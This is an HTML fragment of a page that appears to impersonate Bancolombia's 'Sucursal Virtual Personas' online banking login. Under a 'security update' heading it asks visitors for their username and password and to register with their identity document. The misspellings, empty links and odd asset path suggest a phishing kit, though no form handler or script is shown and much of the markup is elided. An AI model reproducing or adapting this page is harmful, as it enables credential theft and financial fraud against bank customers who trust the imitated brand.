...
<div id="home" style="width: 100%; text-align: center; display: none;">
	...
	<div id="header" class="mua-page-header">
		<div class="row row-logo-svp"> 
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				...
				<div class="text-svp-name">Actualizacion de Seguridad Personas ingresa tu usuario y contraseña</div>
			</div>
		</div>
		<div class="row">
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
						...
						<div class="col-xs-12 col-sm-5 col-md-4"> 
								...
								<div class="panel_general">
									...
									<div class="subtitle-land-label">
										<h4>
											no tienes usuario asignado resgistrate con tu documento de identidad
										</h4>
									</div>
									<div id="contenido">
...
<div class="mua_tooltip_msg">
			...
			Ingrese el usuario que tiene registrado en la Sucursal Virtual Personas.  resgistrate con tu documento de identidad.
										...
										<div class="mua-divIcon">
											<div class="mua-divRow">
												<a class="mua-itemsIcons-btn" href="" target="_blank">
													...
													<img src="hfh/1es.png">&nbsp;
														<span class="control-label">Atencion Sucursal Virtual Personas.</span>
													</div>
												</a>
											</div>
										</div>
	...
	<div class="col-xs-12 col-sm-12 col-md-12">
		<p class="mua-footer mua-footer-info-call">
	        ...
	        <div style="margin-top: 10px;">
	            ...
	            <div class="mua-title-text pull-right"><span id="fecha">2023</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;</div>
	        </div>
